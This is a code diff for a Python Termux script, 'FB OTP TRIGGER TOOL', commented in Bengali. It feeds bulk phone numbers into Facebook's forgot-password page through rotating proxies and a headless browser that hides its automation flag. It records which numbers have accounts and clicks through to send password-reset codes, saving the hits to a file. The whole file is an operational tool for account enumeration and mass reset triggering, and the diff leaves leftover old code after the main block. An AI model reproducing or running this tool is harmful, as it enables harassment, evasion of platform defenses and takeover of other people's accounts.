@@ -1,40 +1,600 @@
 #!/usr/bin/env python3
 """
-🔥 FB PHONE CHECKER - Termux Edition v2.0
-Multi-thread + Proxy Rotation + OTP Trigger
-Worldwide phone number support
-
+🔥 FB OTP TRIGGER TOOL v3.0
+Termux Edition - Direct Run
 Author: cybersecuritybhau-maker
-GitHub: https://github.com/cybersecuritybhau-maker/fb_checker
+
+কাজ:
+- যে কোন ফরম্যাটে নাম্বার নিবে (+ ছাড়া, কমা ছাড়া, স্পেস দিয়েও)
+- Facebook "forgot password" এ নাম্বার দিয়ে OTP ট্রিগার করবে
+- OTP আপনার SMS panel এ চলে আসবে
+- রেজাল্ট রিয়েল-টাইম দেখাবে
 
 Install:
-    pkg update -y && pkg upgrade -y
-    pkg install python chromium -y
-    pip install selenium webdriver-manager phonenumbers
+    pip install selenium webdriver-manager phonenumbers requests beautifulsoup4
 
-Usage:
+ চালানোর জন্য:
     python fb_checker.py
 """
 
-import os
-import sys
-import json
-import re
-import time
-import random
-import threading
-import queue as queue_module
+import os, sys, json, re, time, random, threading, queue, subprocess
 from datetime import datetime
 from typing import List, Dict, Optional, Tuple
 
-# ==================== MODULE CHECK ====================
+# ==================== IMPORTS WITH ERROR CHECK ====================
 
-REQUIRED_MODULES = {
-    "selenium": "selenium",
-    "webdriver_manager": "webdriver-manager",
-    "phonenumbers": "phonenumbers"
-}
+try:
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.chrome.service import Service
+    from webdriver_manager.chrome import ChromeDriverManager
+    import requests as req_lib
+    from bs4 import BeautifulSoup
+    print("✅ All modules loaded successfully!")
+except ImportError as e:
+    print(f"❌ Missing: {e}")
+    print("\nRun: pip install selenium webdriver-manager phonenumbers requests beautifulsoup4")
+    sys.exit(1)
 
+# ==================== CONFIG ====================
+
+RESULTS_FILE = "fb_results.json"
+VALID_FILE = "valid_accounts.txt"
+NUMBERS_FILE = "numbers.txt"
+VERSION = "3.0"
+
+# ==================== PHONE NORMALIZER (যেকোনো ফরম্যাট নেবে) ====================
+
+def normalize_phone(text: str) -> Optional[str]:
+    """
+    + ছাড়া, কমা ছাড়া, স্পেস সহ যেকোনো ফরম্যাট নিবে
+    উদাহরণ: 8801712345678, 01712345678, +8801712345678, +880 1712-345678
+    সবগুলোই কাজ করবে
+    """
+    # শুধু ডিজিট রাখি
+    digits = re.sub(r'[^\d]', '', text)
+    
+    if not digits or len(digits) < 10:
+        return None
+    
+    # বাংলাদেশ
+    if len(digits) == 11 and digits.startswith('01'):
+        return f"+88{digits}"
+    elif len(digits) == 13 and digits.startswith('8801'):
+        return f"+{digits}"
+    # USA
+    elif len(digits) == 10:
+        return f"+1{digits}"
+    elif len(digits) == 11 and digits.startswith('1'):
+        return f"+{digits}"
+    # UK
+    elif len(digits) == 12 and digits.startswith('44'):
+        return f"+{digits}"
+    # India
+    elif len(digits) == 12 and digits.startswith('91'):
+        return f"+{digits}"
+    # Generic
+    elif len(digits) >= 10 and len(digits) <= 15:
+        return f"+{digits}"
+    
+    return None
+
+# ==================== PROXY MANAGER ====================
+
+class ProxyManager:
+    def __init__(self):
+        self.proxies: List[str] = []
+        self.index = 0
+        self.lock = threading.Lock()
+        self._load()
+    
+    def _load(self):
+        if os.path.exists("proxies.txt"):
+            with open("proxies.txt") as f:
+                self.proxies = [
+                    line.strip() for line in f 
+                    if line.strip() and not line.startswith("#")
+                ]
+        if not self.proxies:
+            self.proxies = [
+                "http://103.153.154.110:80",
+                "http://103.174.102.127:80",
+            ]
+    
+    def get(self) -> Optional[str]:
+        with self.lock:
+            if not self.proxies:
+                return None
+            p = self.proxies[self.index % len(self.proxies)]
+            self.index += 1
+            return p
+    
+    def add(self, proxy: str):
+        with self.lock:
+            self.proxies.append(proxy)
+            with open("proxies.txt", "a") as f:
+                f.write(f"{proxy}\n")
+            print(f"  ✅ Proxy added: {proxy}")
+    
+    def count(self) -> int:
+        return len(self.proxies)
+
+# ==================== FACEBOOK OTP TRIGGER ====================
+
+class FBOTPTrigger:
+    """
+    Facebook forgot password page এ নাম্বার দিয়ে OTP ট্রিগার করবে
+    OTP যাবে ঐ নাম্বারের registered SMS/email এ
+    """
+    
+    def __init__(self, proxy_manager: ProxyManager):
+        self.pm = proxy_manager
+        self.stats = {"checked": 0, "otp_sent": 0, "found": 0, "errors": 0}
+    
+    def _create_driver(self):
+        options = Options()
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--headless")
+        options.add_argument("--window-size=1366,768")
+        options.add_argument("--disable-notifications")
+        options.add_argument("--lang=en-US")
+        
+        proxy = self.pm.get()
+        if proxy:
+            options.add_argument(f"--proxy-server={proxy}")
+        
+        # Random user agent
+        ua = random.choice([
+            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
+            "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36",
+            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
+        ])
+        options.add_argument(f"--user-agent={ua}")
+        
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service, options=options)
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        return driver
+    
+    def check_and_trigger_otp(self, phone: str) -> Dict:
+        """
+        Main function:
+        1. Facebook forgot password page খুলবে
+        2. নাম্বার ইনপুট দিবে
+        3. Account খুঁজে বের করবে
+        4. OTP সেন্ড করবে (যদি account থাকে)
+        """
+        result = {
+            "phone": phone,
+            "status": "PENDING",
+            "has_account": False,
+            "otp_triggered": False,
+            "details": "",
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        driver = None
+        try:
+            driver = self._create_driver()
+            
+            # Step 1: Forgot password page
+            driver.get("https://www.facebook.com/login/identify/")
+            time.sleep(3 + random.random() * 2)
+            
+            # Step 2: Enter phone number
+            try:
+                phone_input = WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.NAME, "phone_number"))
+                )
+                phone_input.clear()
+                phone_input.send_keys(phone)
+            except:
+                result["status"] = "⚠️ INPUT ERROR"
+                result["details"] = "Could not find phone input field"
+                self.stats["errors"] += 1
+                return result
+            
+            # Step 3: Click Search
+            try:
+                search_btn = driver.find_element(By.NAME, "did_submit")
+                search_btn.click()
+                time.sleep(4)
+            except:
+                result["status"] = "⚠️ SEARCH ERROR"
+                self.stats["errors"] += 1
+                return result
+            
+            # Step 4: Analyze result
+            page_source = driver.page_source.lower()
+            
+            # Check if account exists (success indicators)
+            account_found_signals = [
+                "continue", "নিশ্চিত করুন", "send code", "কোড পাঠান",
+                "password", "পাসওয়ার্ড", "code", "কোড", "reset",
+                "রিসেট", "confirm", "কনফার্ম", "enter code",
+                "কোড লিখুন", "this phone number", "এই নাম্বার",
+                "send security code", "সিকিউরিটি কোড পাঠান",
+                "text me a code", "reset your password",
+                "find your account", "we found", "আপনার",
+            ]
+            
+            no_account_signals = [
+                "no account found", "অ্যাকাউন্ট পাওয়া যায়নি",
+                "couldn't find", "not found", "খুঁজে পাওয়া যায়নি",
+                "no results", "কোন ফল নেই",
+                "enter a different", "ভিন্ন নম্বর",
+            ]
+            
+            has_account = any(s in page_source for s in account_found_signals)
+            no_account = any(s in page_source for s in no_account_signals)
+            
+            if has_account and not no_account:
+                result["has_account"] = True
+                result["status"] = "✅ VALID ACCOUNT"
+                self.stats["found"] += 1
+                
+                # Step 5: Try to trigger OTP by clicking submit/continue
+                otp_triggered = False
+                button_xpaths = [
+                    "//button[contains(text(), 'Continue')]",
+                    "//button[contains(text(), 'নিশ্চিত')]",
+                    "//button[contains(text(), 'Send')]",
+                    "//button[contains(text(), 'কোড')]",
+                    "//button[contains(text(), 'পাঠান')]",
+                    "//button[contains(text(), 'Submit')]",
+                    "//button[contains(text(), 'Search')]",
+                    "//button[contains(text(), 'খুঁজুন')]",
+                    "//input[@type='submit']",
+                    "//button[@type='submit']",
+                ]
+                
+                for xpath in button_xpaths:
+                    try:
+                        btn = WebDriverWait(driver, 3).until(
+                            EC.element_to_be_clickable((By.XPATH, xpath))
+                        )
+                        driver.execute_script("arguments[0].click();", btn)
+                        time.sleep(2)
+                        result["otp_triggered"] = True
+                        result["status"] = "✅ OTP TRIGGERED!"
+                        result["details"] = f"Clicked: {xpath}"
+                        self.stats["otp_sent"] += 1
+                        break
+                    except:
+                        continue
+                
+                if not result["otp_triggered"]:
+                    # যদি button না পাওয়া যায়, তাহলে try alternative method
+                    try:
+                        # Try any available button or link
+                        all_buttons = driver.find_elements(By.TAG_NAME, "button")
+                        for btn in all_buttons:
+                            try:
+                                if btn.is_displayed() and btn.is_enabled():
+                                    driver.execute_script("arguments[0].click();", btn)
+                                    time.sleep(2)
+                                    result["otp_triggered"] = True
+                                    result["status"] = "✅ OTP TRIGGERED!"
+                                    result["details"] = f"Clicked button: {btn.text[:30]}"
+                                    self.stats["otp_sent"] += 1
+                                    break
+                            except:
+                                continue
+                    except:
+                        pass
+                
+                if not result["otp_triggered"]:
+                    result["status"] = "✅ FOUND (auto-OTP fail)"
+                    result["details"] = "Manual OTP needed from FB page"
+            
+            elif no_account:
+                result["status"] = "❌ NO ACCOUNT"
+                result["details"] = "Phone not registered with Facebook"
+            else:
+                # Ambiguous - might be rate limited
+                result["status"] = "⚠️ UNKNOWN"
+                result["details"] = "Could not determine - possibly rate limited"
+            
+            self.stats["checked"] += 1
+            
+        except Exception as e:
+            result["status"] = f"⚠️ ERROR"
+            result["details"] = str(e)[:80]
+            self.stats["errors"] += 1
+        
+        finally:
+            if driver:
+                try:
+                    driver.quit()
+                except:
+                    pass
+        
+        return result
+
+# ==================== MAIN APP ====================
+
+class FBOTPApp:
+    def __init__(self):
+        self.pm = ProxyManager()
+        self.queue = queue.Queue()
+        self.results: List[Dict] = []
+        self.total = 0
+        self.found = 0
+        self.otp_sent = 0
+        self.start_time = None
+        self.running = False
+        self.lock = threading.Lock()
+    
+    def add_numbers(self, text: str) -> int:
+        """যেকোনো ফরম্যাটে নাম্বার নিবে"""
+        # কমা, স্পেস, নিউলাইন সব দিয়েই আলাদা করা যাবে
+        parts = re.split(r'[,;\n\s\r\t]+', text)
+        count = 0
+        for part in parts:
+            part = part.strip()
+            if not part:
+                continue
+            phone = normalize_phone(part)
+            if phone:
+                self.queue.put(phone)
+                count += 1
+        return count
+    
+    def load_file(self, filename: str = None) -> int:
+        if not filename:
+            filename = NUMBERS_FILE
+        if not os.path.exists(filename):
+            print(f"  ❌ File '{filename}' not found!")
+            return 0
+        
+        count = 0
+        with open(filename, "r") as f:
+            for line in f:
+                phone = normalize_phone(line.strip())
+                if phone:
+                    self.queue.put(phone)
+                    count += 1
+        print(f"  📂 Loaded {count} numbers from {filename}")
+        return count
+    
+    def _worker(self, tid: int):
+        checker = FBOTPTrigger(self.pm)
+        
+        while self.running and not self.queue.empty():
+            try:
+                phone = self.queue.get_nowait()
+            except queue.Empty:
+                break
+            
+            result = checker.check_and_trigger_otp(phone)
+            
+            with self.lock:
+                self.results.append(result)
+                self.total += 1
+                if result["has_account"]:
+                    self.found += 1
+                if result["otp_triggered"]:
+                    self.otp_sent += 1
+                    
+                    # Save valid immediately
+                    with open(VALID_FILE, "a") as f:
+                        f.write(f"{result['phone']} | OTP_SENT | {result['timestamp']}\n")
+                
+                # Show progress
+                elapsed = time.time() - self.start_time
+                rate = self.total / elapsed if elapsed > 0 else 0
+                
+                status_icon = "✅" if "OTP" in result["status"] else \
+                              "🔍" if "VALID" in result["status"] else \
+                              "❌" if "NO" in result["status"] else "⚠️"
+                
+                print(
+                    f"\r  [{tid}] {status_icon} {result['phone']:20s} | "
+                    f"{result['status'][:30]:30s} | "
+                    f"📊 {self.total}/{self.total + self.queue.qsize()} | "
+                    f"✅ {self.found} | 📱 {self.otp_sent} OTP | ⚡{rate:.1f}/s   ",
+                    end="", flush=True
+                )
+            
+            # Auto-save every 10
+            if self.total % 10 == 0:
+                self._save()
+            
+            time.sleep(2 + random.random())
+    
+    def _save(self):
+        try:
+            with open(RESULTS_FILE, "w") as f:
+                json.dump({
+                    "stats": {"total": self.total, "found": self.found, "otp_sent": self.otp_sent},
+                    "results": self.results
+                }, f, indent=2, ensure_ascii=False)
+        except:
+            pass
+    
+    def start(self, threads: int = 3):
+        if self.queue.empty():
+            print("\n  ❌ No numbers to check! Add numbers first.\n")
+            return
+        
+        self.running = True
+        self.start_time = time.time()
+        
+        total_q = self.queue.qsize()
+        
+        print(f"\n{'='*55}")
+        print(f"  🚀 FB OTP TRIGGER TOOL v{VERSION}")
+        print(f"{'='*55}")
+        print(f"  📱 Queue: {total_q} numbers")
+        print(f"  🧵 Threads: {threads}")
+        print(f"  🔌 Proxies: {self.pm.count()}")
+        print(f"{'='*55}\n")
+        
+        threads_list = []
+        for i in range(threads):
+            t = threading.Thread(target=self._worker, args=(i+1,), daemon=True)
+            t.start()
+            threads_list.append(t)
+        
+        try:
+            for t in threads_list:
+                t.join()
+        except KeyboardInterrupt:
+            print("\n\n  🛑 Stopping...")
+            self.running = False
+        
+        self.running = False
+        self._save()
+        
+        elapsed = time.time() - self.start_time
+        print(f"\n\n{'='*55}")
+        print(f"  ✅ COMPLETE!")
+        print(f"{'='*55}")
+        print(f"  📊 Checked: {self.total}")
+        print(f"  🔍 Accounts Found: {self.found}")
+        print(f"  📱 OTP Triggered: {self.otp_sent}")
+        print(f"  ⏱️  Time: {elapsed:.1f}s")
+        print(f"  ⚡ Speed: {self.total/elapsed:.1f}/s" if elapsed > 0 else "")
+        print(f"{'='*55}")
+        
+        # Show valid accounts
+        valid = [r for r in self.results if r["has_account"]]
+        if valid:
+            print(f"\n  🎯 ACCOUNTS WITH OTP TRIGGERED:")
+            for r in valid:
+                otp_icon = "📱" if r["otp_triggered"] else "🔍"
+                print(f"    {otp_icon} {r['phone']} | {r['status']}")
+        
+        print(f"\n  💾 Results saved to {RESULTS_FILE}")
+        print(f"  💾 Valid accounts saved to {VALID_FILE}")
+
+# ==================== CLI ====================
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def banner():
+    clear()
+    print(f"""
+╔══════════════════════════════════════╗
+║   🔥 FB OTP TRIGGER v{VERSION}          ║
+║   Termux Edition                     ║
+║   Multi-Thread + Proxy               ║
+║   Author: cybersecuritybhau-maker     ║
+╚══════════════════════════════════════╝
+""")
+
+def setup():
+    if not os.path.exists("proxies.txt"):
+        with open("proxies.txt", "w") as f:
+            f.write("# Proxy list\nhttp://103.153.154.110:80\nhttp://103.174.102.127:80\n")
+
+def main():
+    setup()
+    app = FBOTPApp()
+    
+    while True:
+        banner()
+        print("  MAIN MENU:")
+        print("  1. 📱  Add numbers (যেকোনো ফরম্যাটে)")
+        print("  2. 📂  Load from file")
+        print("  3. 🔌  Proxy management")
+        print("  4. 🚀  START CHECKING")
+        print("  5. 📊  Show results")
+        print("  6. 💾  Save & Export")
+        print("  0. ❌  Exit")
+        
+        choice = input("\n  👉 Select: ").strip()
+        
+        if choice == "1":
+            banner()
+            print("  📱 Enter phone numbers:")
+            print("     যেকোনো ফরম্যাটে দিন:")
+            print("     01712345678, +8801712345678, 8801712345678")
+            print("     অথবা স্পেস দিয়ে: 0171 0191 88017")
+            print()
+            text = input("  📱 Numbers: ").strip()
+            if text:
+                count = app.add_numbers(text)
+                print(f"\n  ✅ {count} numbers added to queue!")
+            else:
+                print("\n  ❌ No input!")
+            input("\n  Press Enter...")
+        
+        elif choice == "2":
+            banner()
+            f = input(f"  📂 File (default {NUMBERS_FILE}): ").strip()
+            app.load_file(f if f else None)
+            input("\n  Press Enter...")
+        
+        elif choice == "3":
+            banner()
+            print(f"  🔌 Proxies: {app.pm.count()}")
+            print("  1. Show all")
+            print("  2. Add proxy")
+            pc = input("\n  Select: ").strip()
+            if pc == "1":
+                print(f"\n  Proxies: {app.pm.count()}")
+            elif pc == "2":
+                p = input("  Enter proxy (http://IP:PORT): ").strip()
+                if p:
+                    app.pm.add(p)
+            input("\n  Press Enter...")
+        
+        elif choice == "4":
+            banner()
+            if app.queue.empty():
+                print("  ❌ Queue empty! Add numbers first.")
+                input("\n  Press Enter...")
+                continue
+            
+            try:
+                t = input(f"  Threads (1-10, default 3): ").strip()
+                threads = max(1, min(10, int(t) if t else 3))
+            except:
+                threads = 3
+            
+            app.start(threads=threads)
+            input("\n  Press Enter...")
+        
+        elif choice == "5":
+            banner()
+            print(f"  📊 RESULTS:\n")
+            print(f"  📱 Total checked: {app.total}")
+            print(f"  🔍 Accounts found: {app.found}")
+            print(f"  📱 OTP triggered: {app.otp_sent}")
+            
+            valid = [r for r in app.results if r["has_account"]]
+            if valid:
+                print(f"\n  🎯 VALID ACCOUNTS ({len(valid)}):")
+                for r in valid:
+                    print(f"    {'📱' if r['otp_triggered'] else '🔍'} {r['phone']} | {r['status']}")
+            
+            input("\n  Press Enter...")
+        
+        elif choice == "6":
+            app._save()
+            print(f"\n  ✅ Saved to {RESULTS_FILE} and {VALID_FILE}")
+            input("\n  Press Enter...")
+        
+        elif choice == "0":
+            print("\n  👋 Exiting...")
+            break
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n  🛑 Bye!")
+    except Exception as e:
+        print(f"\n  ❌ Error: {e}")
+        import traceback
+        traceback.print_exc()
 missing = []
 for mod_name, pip_name in REQUIRED_MODULES.items():
     try:
